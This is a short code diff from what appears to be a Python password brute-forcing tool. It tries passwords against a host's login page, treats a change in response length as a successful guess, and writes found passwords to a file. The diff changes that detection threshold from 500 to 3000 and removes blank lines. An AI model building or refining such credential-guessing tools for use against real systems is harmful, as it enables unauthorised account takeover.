@@ -57,8 +57,6 @@ def _WRITE_PASSWORD(*args, **kwargs):
 
 
 
-
-
 def _INDEX(*args, **kwargs):
     os.system("clear")
     _PRINT(f"[ {Y}===>{N} ] Find {W}{args[3]}{N} Passwords and write in {os.getcwd()}/Password.txt ^^\n") if int(args[3]) > 0 else ""
@@ -112,7 +110,7 @@ def _PROCESS_DATA(*args, **kwargs):
             _R = False
 
         if int(DATA.headers['Content-Length']) < PROCESS_SIZE and int(DATA.status_code) == 200:
-            if  PROCESS_SIZE - int(DATA.headers['Content-Length']) > 500:
+            if  PROCESS_SIZE - int(DATA.headers['Content-Length']) > 3000:
                     _S.get(url=f"http://{HOST}/logout")
                     _S.delete(url=f"http://{HOST}/login")                    
                     _WRITE_PASSWORD(PASSWIRD)
